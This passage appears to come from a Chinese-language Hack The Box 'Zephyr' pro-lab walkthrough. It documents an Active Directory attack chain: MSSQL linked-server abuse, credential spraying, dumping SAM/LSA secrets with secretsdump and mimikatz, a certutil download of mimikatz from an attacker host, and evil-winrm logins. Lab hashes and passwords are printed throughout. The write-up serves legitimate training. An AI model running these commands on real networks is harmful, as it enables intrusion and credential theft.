ZSM\ZPH-SVRSQL01$:plain_password_hex:7cc0819a46fa0afdb783fd40c1f34ee906e83e11b9589649a81f3d9050ed3ce74e3c7107ea983a9ff25bc228c632cbaf31bba0b4adc0799d792c2e6251af42a8df3560a88122194d10a939608984346b80e10ad0ed0dcd947c75c08ded68c709a6e3c9a4403fcb765d74142b3e56b523e1d51d30e7cad35af44357219928bb0b1650b554338ac70136f7d4bdd5fa5ad3949db494959e05ddebd86e9025e428ebdaddf1014d71a29d6741f6bde00d4f7e3337484bc36dc3ddd6186f06f96dcf3a4064d37d293b160992b34f52f07fb60cb061d9dddc0d6908030b4184b68cae0fcd1f5a4a1fc7e928866fe6af4fa38b83                                                                                                                                                                                               
ZSM\ZPH-SVRSQL01$:aad3b435b51404eeaad3b435b51404ee:ecf68b5e132ca80e6864215d5fcbba03:::                                                                                                                                                      
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe5b070b6fc2af924d7d7be1b2871f10d64453cba
dpapi_userkey:0x6d326a8d8b29a1e2db89d4e9d1b6df7035db2a76
[*] NL$KM 
 0000   02 92 96 34 89 68 37 22  22 DD 4F BD BD B3 11 35   ...4.h7"".O....5
 0010   BD 5A D2 7A 27 AF 48 23  F2 CA 71 F4 A0 6A B7 C4   .Z.z'.H#..q..j..
 0020   2E 84 50 63 DF 17 01 4F  EA 92 50 C4 DD 9B 86 D2   ..Pc...O..P.....
 0030   48 3E CC 80 5E B5 30 96  7A DD 48 CB CC BF E1 E3   H>..^.0.z.H.....
NL$KM:029296348968372222dd4fbdbdb31135bd5ad27a27af4823f2ca71f4a06ab7c42e845063df17014fea9250c4dd9b86d2483ecc805eb530967add48cbccbfe1e3
[*] Cleaning up... 
[*] Stopping service RemoteRegistry

```

```
cat > /root/all_creds.txt << 'EOF'
marcus:!QAZ2wsx
jamie:Test@123456
zabbix:rDhHbBEfh35sMbkY
backdoor:P@ss123!
EOF

cat > /root/all_hashes.txt << 'EOF'
Administrator:7ac325190bb999ef4ad73b0b67e8e33c
ZPH-SVRMGMT1$:89d0b56874f61ad38bad336a77b8ef2f
ZPH-SVRSQL01$:ecf68b5e132ca80e6864215d5fcbba03
EOF

# 用所有凭据批量撞 .10 .12 .14 .16 .17 .18 .19
proxychains4 nxc smb 192.168.210.0/24 -u /root/all_creds.txt -d zsm.local --continue-on-success
```

没啥用

```
C:\Windows\system32> nltest /domain_trusts
List of domain trusts:
    0: PAINTERS painters.htb (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
    1: internal internal.zsm.local (NT 5) (Forest: 2) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    2: ZSM zsm.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully

C:\Windows\system32> sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -Q "SELECT name FROM sys.databases"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
zabbix_hosts                                                                                                                    

(5 rows affected)

C:\Windows\system32> sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -Q "USE zabbix_hosts; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"
Changed database context to 'zabbix_hosts'.
TABLE_NAME                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
hosts                                                                                                                           

(1 rows affected)

C:\Windows\system32> sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -Q "SELECT * FROM zabbix_hosts.dbo.hosts"
.LOCAL                             192.168.210.15                                     ZEPHYR                                            
          6 ZPH-SVRCDC01.INTERNAL.ZSM.LOCAL                    192.168.210.16                                     INTERNAL.ZEPHYR                                   
          7 ZPH-SVRCHR..INTERNAL.ZSM.LOCAL                     192.168.210.17                                     INTERNAL.ZEPHYR                                   
          8 ZPH-SVRCSUP.INTERNAL.ZSM.LOCAL                     192.168.210.18                                     INTERNAL.ZEPHYR                                   
          9 DC.PAINTERS.HTB                                    192.168.110.55                                     PAINTERS                                          

(9 rows affected)


```

```
                                                                                                                                                                                                                                          
┌──(root㉿kali)-[~]
└─# # 用 LDAP 查 gMSA 详情
proxychains4 ldapsearch -H ldap://192.168.210.10 -D 'marcus@zsm.local' -w '!QAZ2wsx' -b 'CN=Managed Service Accounts,DC=zsm,DC=local' '(objectClass=msDS-GroupManagedServiceAccount)' sAMAccountName msDS-ManagedPasswordId msDS-GroupMSAMembership
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  192.168.229.128:9998  ...  192.168.210.10:389  ...  OK
# extended LDIF
#
# LDAPv3
# base <CN=Managed Service Accounts,DC=zsm,DC=local> with scope subtree
# filter: (objectClass=msDS-GroupManagedServiceAccount)
# requesting: sAMAccountName msDS-ManagedPasswordId msDS-GroupMSAMembership 
#

# ZPH-GMSA-ADFS, Managed Service Accounts, zsm.local
dn: CN=ZPH-GMSA-ADFS,CN=Managed Service Accounts,DC=zsm,DC=local
sAMAccountName: ZPH-GMSA-ADFS$
msDS-ManagedPasswordId:: AQAAAEtEU0sCAAAAbAEAAAcAAAADAAAAquDveAGMHhFcQd8Xkuox0
 QAAAAAUAAAAFAAAAHoAcwBtAC4AbABvAGMAYQBsAAAAegBzAG0ALgBsAG8AYwBhAGwAAAA=
msDS-GroupMSAMembership:: AQAEgBQAAAAAAAAAAAAAACQAAAABAgAAAAAABSAAAAAgAgAABAAs
 AAEAAAAAACQA/wEPAAEFAAAAAAAFFQAAAM73+aI0MYUbsDx0CFQEAAA=

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

### ZEPHYR-SQL02(.19)子域

找链接服务器

```
:\Windows\system32> sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -y 0 -Y 0 -Q "EXEC sp_linkedservers"
sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -Q "SELECT SRV_NAME, SRV_PROVIDERNAME, SRV_PRODUCT, SRV_DATASOURCE, SRV_PROVIDERSTRING, SRV_CAT FROM master.sys.servers"ZPH-SVRSQL01 SQLNCLI SQL Server ZPH-SVRSQL01 NULL NULL NULL
ZSM-SVRCSQL02 SQLNCLI SQL Server ZSM-SVRCSQL02 NULL NULL NULL

(2 rows affected)

C:\Windows\system32> sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -y 0 -Y 0 -Q "EXEC sp_linkedservers"
ZPH-SVRSQL01 SQLNCLI SQL Server ZPH-SVRSQL01 NULL NULL NULL
ZSM-SVRCSQL02 SQLNCLI SQL Server ZSM-SVRCSQL02 NULL NULL NULL

(2 rows affected)

C:\Windows\system32> sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -Q "SELECT SRV_NAME, SRV_PROVIDERNAME, SRV_PRODUCT, SRV_DATASOURCE, SRV_PROVIDERSTRING, SRV_CAT FROM master.sys.servers"
Msg 207, Level 16, State 1, Server ZPH-SVRSQL01, Line 1
Invalid column name 'SRV_NAME'.
Msg 207, Level 16, State 1, Server ZPH-SVRSQL01, Line 1
Invalid column name 'SRV_PROVIDERNAME'.
Msg 207, Level 16, State 1, Server ZPH-SVRSQL01, Line 1
Invalid column name 'SRV_PRODUCT'.
Msg 207, Level 16, State 1, Server ZPH-SVRSQL01, Line 1
Invalid column name 'SRV_DATASOURCE'.
Msg 207, Level 16, State 1, Server ZPH-SVRSQL01, Line 1
Invalid column name 'SRV_PROVIDERSTRING'.
Msg 207, Level 16, State 1, Server ZPH-SVRSQL01, Line 1
Invalid column name 'SRV_CAT'.

C:\Windows\system32> 

```

**ZSM-SVRCSQL02** 是链接服务器。查它的登录映射和 IP

```
REM 查链接服务器登录映射（可能含明文凭据）
sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -Q "SELECT name, data_source, provider_string FROM sys.servers"

REM 查远程登录映射
sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -Q "EXEC sp_helplinkedsrvlogin 'ZSM-SVRCSQL02'"

REM 查 IP
nslookup ZSM-SVRCSQL02.zsm.local 192.168.210.10
nslookup ZSM-SVRCSQL02 192.168.210.10

REM 尝试通过链接服务器执行命令
sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -Q "SELECT * FROM OPENQUERY(ZSM-SVRCSQL02, 'SELECT @@VERSION')"
```

```
C:\Windows\system32> sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -y 0 -Q "SELECT name, product, provider, data_source, is_linked FROM sys.servers"
ZPH-SVRSQL01 SQL Server SQLNCLI ZPH-SVRSQL01 0
ZSM-SVRCSQL02 SQL Server SQLNCLI ZSM-SVRCSQL02 1

(2 rows affected)

C:\Windows\system32> sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -y 0 -Q "EXEC sp_helplinkedsrvlogin 'ZSM-SVRCSQL02'"
ZSM-SVRCSQL02 sa 0 sa

(1 rows affected)


C:\Windows\system32> sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -y 0 -Q "SELECT * FROM OPENQUERY(ZSM-SVRCSQL02, 'SELECT SYSTEM_USER')"
Msg 102, Level 15, State 1, Server ZPH-SVRSQL01, Line 1
Incorrect syntax near '-'.
```

 链接服务器用 `sa` 映射登录。虽然 `OPENQUERY` 报错，但可以用 `EXEC AT` 在远程执行

需要为 zabbix 添加链接服务器登录映射。zabbix 是 sysadmin，可以做到：

```
REM 添加 zabbix 的映射到远程 sa
sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -y 0 -Q "EXEC sp_addlinkedsrvlogin 'ZSM-SVRCSQL02', 'false', 'zabbix', 'sa', 'rDhHbBEfh35sMbkY'"

REM 或者直接模拟 sa 执行
sqlcmd -S . -U zabbix -P "rDhHbBEfh35sMbkY" -y 0 -Q "EXECUTE AS LOGIN = 'sa'; EXEC ('SELECT SYSTEM_USER') AT [ZSM-SVRCSQL02]; REVERT"
```

![image-20260719184651425](/images/htb-prolab/zephyr/20260719184651577.png)

查询网络信息

![image-20260721171910447](/images/htb-prolab/zephyr/20260721171910706.png)

potato本地提权

```
 proxychains4 impacket-psexec './roxci:Passw0rd@192.168.210.19'
```

![image-20260719192140831](/images/htb-prolab/zephyr/20260719192140906.png)

```
C:\Users\Administrator\Desktop> type flag.txt
ZEPHYR{G0tt4_l1nk_Up_4m_1_r1gh7?}
```

信息收集

```
REM 基本信息
hostname
whoami
ipconfig /all
whoami /priv

REM 域信息（internal.zsm.local 子域）
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Computers" /domain
nltest /dclist:internal.zsm.local
nltest /domain_trusts

REM ARP 和网络连接
arp -a
netstat -ano | findstr ESTABLISHED
route print

REM 导出凭据
reg save HKLM\SAM C:\Users\Public\sam.save
reg save HKLM\SECURITY C:\Users\Public\sec.save
reg save HKLM\SYSTEM C:\Users\Public\sys.save

REM 本地用户和组
net user
net localgroup Administrators

net user /domain
net group "Domain Admins" /domain
nltest /dclist:internal.zsm.local
nltest /domain_trusts
dir /s /b C:\*flag* C:\Users\*.txt 2>nul
type C:\Users\Administrator\Desktop\flag.txt 2>nul
```

```
──(root㉿kali)-[~/桌面/impacket-0.13.0/examples]
└─# # 在 /root/桌面/impacket-0.13.0/examples/ 目录下
python3 secretsdump.py -sam sam.save -system sys.save -security sec.save LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x089d55a4ed9f4b67d969139aa7a4bbf5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5dc71607c06cf83eea0f3d789bce419c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
roxci:1001:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
[*] Dumping cached domain logon information (domain/username:hash)
INTERNAL.ZSM.LOCAL/mssql_svc:$DCC2$10240#mssql_svc#2670ceadeaf374ea9c966b9c2334456f: (2026-07-19 02:11:15+00:00)
INTERNAL.ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#c8746666c3dc9b7d6179a96b79f1dcd3: (2026-06-04 04:00:24+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:c92f2e04b9aa308fa926e0e0686346a3b2774b7d066a3e7e6500d8b9887956b22314544f9c1017cb727b5f5e4a4f7a410eb714b26b65bac07f72f4854e85e3d1faaa3083da949679378d12a3289cd0d1fa33ae89ec5a13eea86fac1d3c956445aeb8225a98f9b9f1cbd0a41544c18ad238e3d4a0e5221b2f89464920e0c9ce151b1af46df73cbbdeaff2e4c7d143d4ae94f6f59db0bea0e86143b882b822309029684eccbcfe337795e3ce185657e921611623f609cab4203518ba28768f90b104f211da75c3dd0aac5934d2109939bf311a7e2670fff7578b22a385e1cc64c5339b5ae3e0e68461b5622d13341ffdeb
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:ad854719bbb6fc1664316a14cc6eb88d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc50ee67b890124a14ec6735ee1caff337232119f
dpapi_userkey:0x301e82f7c1ae1007ba510b38397b8affffab112d
[*] NL$KM 
 0000   07 E9 F2 3F 08 49 46 07  02 CE 30 4B 65 D3 86 32   ...?.IF...0Ke..2
 0010   6F 02 5D 36 7D E8 30 33  F4 71 94 44 98 37 CB 1A   o.]6}.03.q.D.7..
 0020   05 CC 76 F1 26 E2 94 E7  D3 54 78 1F EF BE E9 13   ..v.&....Tx.....
 0030   30 3B 62 CB A5 57 75 E6  78 F3 D4 55 5C 68 20 15   0;b..Wu.x..U\h .
NL$KM:07e9f23f0849460702ce304b65d386326f025d367de83033f47194449837cb1a05cc76f126e294e7d354781fefbee913303b62cba55775e678f3d4555c682015
[*] _SC_MSSQLSERVER 
(Unknown User):ToughPasswordToCrack123!
[*] Cleaning up... 

```

找到域服务账户

```
_SC_MSSQLSERVER: ToughPasswordToCrack123!

proxychains4 bloodhound-python -d internal.zsm.local -u mssql_svc -p 'ToughPasswordToCrack123!' -dc ZPH-SVRCDC01.internal.zsm.local -ns 192.168.210.16 --dns-tcp --disable-autogc -c All --zip
```

bloodhound进行信息收集

上传mimikatz

```
certutil -urlcache -f http://192.168.210.13:9999/m.exe C:\Users\Public\m.exe
C:\Users\Public\m.exe "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::lsa /patch" "vault::list" "exit"
```

```
ser name : 
SID name  : NT AUTHORITY\SYSTEM

576     {0;000003e7} 1 D 44461          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 14090379    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)       Primary
 * Thread Token  : {0;000003e7} 1 D 14113861    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : ZSM-SVRCSQL02
SysKey : 089d55a4ed9f4b67d969139aa7a4bbf5
Local SID : S-1-5-21-2734290894-461713716-141835440

SAMKey : a0e73cf54a9e01be47977b29815a5c18

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 5dc71607c06cf83eea0f3d789bce419c
    lm  - 0: 68f3b7e28fd9b5ad653dc93426549b85
    ntlm- 0: 5dc71607c06cf83eea0f3d789bce419c
    ntlm- 1: cf3a5525ee9414229e66279623ed5c58

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6dfa815eaa4e2ee64a61d69fdd405ebe

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZSM-SVRCSQL02.INTERNAL.ZSM.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : eb1ef42b8f33a1aa497ec83d3159e2adb726eb63df8044c78413d8442c58eb6b
      aes128_hmac       (4096) : 78829c58b6b983f68a9b329246b65f72
      des_cbc_md5       (4096) : 912643ae8f8ac2cb
    OldCredentials
      aes256_hmac       (4096) : 3090e4f67e4e76a9cc4761082bf1ee7f48139064d898453c51c3b28e1d47d014
      aes128_hmac       (4096) : 1bcc5ef9fec5ee8064f376461ff89500
      des_cbc_md5       (4096) : 0d7946bc2ae097e3
    OlderCredentials
      aes256_hmac       (4096) : 4af72c259ee83c599c0681d325b34ed710f0353f5a7a4b541a633d4e12407b89
      aes128_hmac       (4096) : 97939a08869be5e339d02542ecfcd3da
      des_cbc_md5       (4096) : e6cd68dc49d32cb3

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ZSM-SVRCSQL02.INTERNAL.ZSM.LOCALAdministrator
    Credentials
      des_cbc_md5       : 912643ae8f8ac2cb
    OldCredentials
      des_cbc_md5       : 0d7946bc2ae097e3


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

RID  : 000003e9 (1001)
User : roxci
  Hash NTLM: a87f3a337d73085c45f9416be5787d86
    lm  - 0: 27fc4ebf9427775539b56be42978c10b
    lm  - 1: 97b935de7bf6d0aa972bcee662a184f3
    ntlm- 0: a87f3a337d73085c45f9416be5787d86
    ntlm- 1: 217e50203a5aba59cefa863c724bf61b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ab2f27dbb3ccc4d266d9059d45012d09

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZSM-SVRCSQL02.INTERNAL.ZSM.LOCALroxci
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 45102b22d3cd1e2b954772c499d2eabdf1b13d21cf056d57173580da4003b5d5
      aes128_hmac       (4096) : 3819a847ed9d8f6f2cf7278acd4c4dd5
      des_cbc_md5       (4096) : 9e1920ab31da1a79
    OldCredentials
      aes256_hmac       (4096) : 52f07e36b457ab5aa06c8978f5a62dbc95669bfa7a0ff11a6cebff6c3e46b48a
      aes128_hmac       (4096) : 0a36f7cd45b334ce5d91583fb9030078
      des_cbc_md5       (4096) : 2523da8f193ec2ad

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ZSM-SVRCSQL02.INTERNAL.ZSM.LOCALroxci
    Credentials
      des_cbc_md5       : 9e1920ab31da1a79
    OldCredentials
      des_cbc_md5       : 2523da8f193ec2ad


mimikatz(commandline) # lsadump::secrets
Domain : ZSM-SVRCSQL02
SysKey : 089d55a4ed9f4b67d969139aa7a4bbf5

Local name : ZSM-SVRCSQL02 ( S-1-5-21-2734290894-461713716-141835440 )
Domain name : internal ( S-1-5-21-3056178012-3972705859-491075245 )
Domain FQDN : internal.zsm.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {f9a6c492-1619-2f39-cf1c-02b9acf580ea}
  [00] {f9a6c492-1619-2f39-cf1c-02b9acf580ea} 780cb3e4a910bbd1413a4e38916620cace95877ff101dae8357ebd53007e7b81

Secret  : $MACHINE.ACC

cur/hex : c9 2f 2e 04 b9 aa 30 8f a9 26 e0 e0 68 63 46 a3 b2 77 4b 7d 06 6a 3e 7e 65 00 d8 b9 88 79 56 b2 23 14 54 4f 9c 10 17 cb 72 7b 5f 5e 4a 4f 7a 41 0e b7 14 b2 6b 65 ba c0 7f 72 f4 85 4e 85 e3 d1 fa aa 30 83 da 94 96 79 37 8d 12 a3 28 9c d0 d1 fa 33 ae 89 ec 5a 13 ee a8 6f ac 1d 3c 95 64 45 ae b8 22 5a 98 f9 b9 f1 cb d0 a4 15 44 c1 8a d2 38 e3 d4 a0 e5 22 1b 2f 89 46 49 20 e0 c9 ce 15 1b 1a f4 6d f7 3c bb de af f2 e4 c7 d1 43 d4 ae 94 f6 f5 9d b0 be a0 e8 61 43 b8 82 b8 22 30 90 29 68 4e cc bc fe 33 77 95 e3 ce 18 56 57 e9 21 61 16 23 f6 09 ca b4 20 35 18 ba 28 76 8f 90 b1 04 f2 11 da 75 c3 dd 0a ac 59 34 d2 10 99 39 bf 31 1a 7e 26 70 ff f7 57 8b 22 a3 85 e1 cc 64 c5 33 9b 5a e3 e0 e6 84 61 b5 62 2d 13 34 1f fd eb 
    NTLM:ad854719bbb6fc1664316a14cc6eb88d
    SHA1:344ab1f3bcba8093a1787365a003034431f9875a
old/hex : b1 de 5b 21 fe a1 7e 45 0d 4e 52 af 1b 40 f0 91 eb b1 cd 6a 66 fe 30 72 6e 30 55 8a bf 47 31 fd fd a7 84 bb 21 42 f2 5f 27 bf f4 09 d8 aa 04 74 5d 18 65 f9 33 71 48 0a 0d e0 5a 40 98 f1 ff c7 5e 87 44 12 d1 05 7c 63 e4 1c 16 dc b2 2a bc f5 11 9d 3f 2f 5c e8 31 df 6c 8b 98 09 a7 31 ac 8a 6e b6 29 ae ac 6d aa f5 76 1e 76 43 9f 20 0e c1 c7 92 a2 98 54 23 d6 1c b0 26 d4 7e 9f 6e 67 22 8f dc ad bc 54 87 1b 7f 50 c8 e1 23 10 49 2f 9f 49 6e 86 9b 7b 5c db 5e 1d 54 77 8f 01 8a 6a 9b 04 9e 67 11 7e c3 67 08 e3 3d f1 47 72 d5 4f 19 e9 20 0f fb fd 03 0d b7 05 2b e1 bc d2 e7 c5 62 75 88 b5 a4 90 a4 be 5b 4d e2 ca d8 f0 b2 39 e8 ee a4 c7 6d 89 86 d3 16 5c 2b 00 85 26 31 71 e6 b8 d3 23 33 0a ab 3e 58 d2 af 2a ff cf 33 1a f0 
    NTLM:6522c8bfd8716727907dacfd0402049b
    SHA1:4158cb0c4e008efb73ec0a077f135aa1847b9b19

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 c5 0e e6 7b 89 01 24 a1 4e c6 73 5e e1 ca ff 33 72 32 11 9f 30 1e 82 f7 c1 ae 10 07 ba 51 0b 38 39 7b 8a ff ff ab 11 2d 
    full: c50ee67b890124a14ec6735ee1caff337232119f301e82f7c1ae1007ba510b38397b8affffab112d
    m/u : c50ee67b890124a14ec6735ee1caff337232119f / 301e82f7c1ae1007ba510b38397b8affffab112d
old/hex : 01 00 00 00 93 d9 75 8d c3 ce b7 93 53 65 c8 d2 a9 b3 73 e6 b6 91 86 08 85 70 66 06 12 e1 9f b3 2d 98 cd 14 85 43 e4 79 0e 49 f7 ed 
    full: 93d9758dc3ceb7935365c8d2a9b373e6b69186088570660612e19fb32d98cd148543e4790e49f7ed
    m/u : 93d9758dc3ceb7935365c8d2a9b373e6b6918608 / 8570660612e19fb32d98cd148543e4790e49f7ed

Secret  : NL$KM
cur/hex : 07 e9 f2 3f 08 49 46 07 02 ce 30 4b 65 d3 86 32 6f 02 5d 36 7d e8 30 33 f4 71 94 44 98 37 cb 1a 05 cc 76 f1 26 e2 94 e7 d3 54 78 1f ef be e9 13 30 3b 62 cb a5 57 75 e6 78 f3 d4 55 5c 68 20 15 
old/hex : 07 e9 f2 3f 08 49 46 07 02 ce 30 4b 65 d3 86 32 6f 02 5d 36 7d e8 30 33 f4 71 94 44 98 37 cb 1a 05 cc 76 f1 26 e2 94 e7 d3 54 78 1f ef be e9 13 30 3b 62 cb a5 57 75 e6 78 f3 d4 55 5c 68 20 15 

Secret  : _SC_MSSQLSERVER / service 'MSSQLSERVER' with username : internal\mssql_svc
cur/text: ToughPasswordToCrack123!

Secret  : _SC_SQLTELEMETRY / service 'SQLTELEMETRY' with username : NT Service\SQLTELEMETRY

mimikatz(commandline) # lsadump::lsa /patch
Domain : ZSM-SVRCSQL02 / S-1-5-21-2734290894-461713716-141835440

RID  : 000001f4 (500)
User : Administrator
LM   : 
NTLM : 5dc71607c06cf83eea0f3d789bce419c

RID  : 000001f7 (503)
User : DefaultAccount
LM   : 
NTLM : 

RID  : 000001f5 (501)
User : Guest
LM   : 
NTLM : 

RID  : 000003e9 (1001)
User : roxci
LM   : 
NTLM : a87f3a337d73085c45f9416be5787d86

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   : 
NTLM : 

mimikatz(commandline) # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
        Items (0)

mimikatz(commandline) # exit
Bye!

```

```
Secret  : DPAPI_SYSTEM
full: c50ee67b890124a14ec6735ee1caff337232119f301e82f7c1ae1007ba510b38397b8affffab112d
```

- DPAPI 系统主密钥可用于离线解密此机器上任何 DPAPI 加密的数据，例如：

  - 浏览器保存的密码
  - RDP 连接凭据
  - 计划任务中存储的密码
  - 其他应用程序的加密配置

  

### ZEPHYR-CA(.12)

在11机子上我们曾经更改过密码jamie，通过枚举发现能够直接登录12

```
proxychains4 nxc winrm 192.168.210.11 -u jamie -p 'Test@123456'
```

![image-20260719205414514](/images/htb-prolab/zephyr/20260719205414642.png)

```
proxychains4 evil-winrm -i 192.168.210.12 -u jamie -p 'Test@123456'
```

发现权限有限

```
┌──(root㉿kali)-[~]
└─# proxychains4 evil-winrm -i 192.168.210.12 -u jamie -p 'Test@123456'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Dynamic chain  ...  192.168.229.128:9998  ...  192.168.210.12:5985  ...  OK
*Evil-WinRM* PS C:\Users\jamie\Documents> whoami /all

USER INFORMATION
----------------

User Name SID
========= ============================================
zsm\jamie S-1-5-21-2734290894-461713716-141835440-4602


GROUP INFORMATION
-----------------

Group Name                              Type             SID                                          Attributes
======================================= ================ ============================================ ==================================================
Everyone                                Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                           Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                    Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users        Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization          Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
ZSM\CA Managers                         Group            S-1-5-21-2734290894-461713716-141835440-4103 Mandatory group, Enabled by default, Enabled group
ZSM\General Management                  Group            S-1-5-21-2734290894-461713716-141835440-4603 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication        Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level  Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\jamie\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\jamie\Documents> 

```

jamie 是 **ZSM\CA Managers** 组成员 — 这是 CA 管理组！具有证书管理权限

flag在公共桌面下

#### 信息收集

当时在11这个机子上抓了hash

```
root㉿kali)-[~/桌面/pywhisker-main/pywhisker]
└─# export KRB5CCNAME=$(pwd)/administrator.ccache
proxychains4 impacket-secretsdump -k -no-pass 'zsm.local/administrator@ZPH-SVRMGMT1.zsm.local'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Dynamic chain  ...  192.168.116.128:9998  ...  192.168.210.11:445  ...  OK
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x90c9f7848607977407f9afabdb3cfcc0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:545c503123664e5713439e088bd91035:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:68a58eed2cff6a92dd8d2d5b9116be4f:::
[*] Dumping cached domain logon information (domain/username:hash)
ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6: (2026-06-03 16:27:26+00:00)
